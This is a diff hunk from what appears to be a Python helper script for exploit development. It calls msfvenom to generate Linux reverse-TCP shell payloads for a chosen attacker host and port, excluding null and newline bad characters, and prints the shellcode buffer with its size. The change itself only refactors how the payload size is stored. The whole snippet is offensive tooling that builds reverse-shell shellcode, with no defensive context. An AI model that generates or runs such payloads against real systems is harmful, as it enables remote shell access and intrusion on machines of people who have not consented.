@@ -12,6 +12,6 @@ PLATFORM = sys.argv[3]
 
 print("[+] => msfvenom -fc -p linux/{}/shell_reverse_tcp LHOST={} LPORT={} -b'\\x00\\x0a'".format(PLATFORM, IP, PORT))
 process = Popen(["msfvenom", "-fc", "-plinux/{}/shell_reverse_tcp".format(PLATFORM), "LHOST={}".format(IP), "LPORT={}".format(PORT), "-b'\\x00\\x0a'"], stdout=PIPE, stderr=PIPE).communicate()
-
-print("[+] => {} bytes.\n".format(re.findall(r1, process[1])[0]))
-print(process[0][process[0].find('buf')+8:].replace('\n', '').replace('""', '')[:-1]+"  ###rs {} {} #{}".format(IP, PORT, re.findall(r1, process[1])[0])+"\n")
+size = re.findall(r1, process[1])[0]
+print("[+] => {} bytes.\n".format(size))
+print(process[0][process[0].find('buf')+8:].replace('\n', '').replace('""', '')[:-1]+"  ###rs {} {} #{}".format(IP, PORT, size)+"\n")
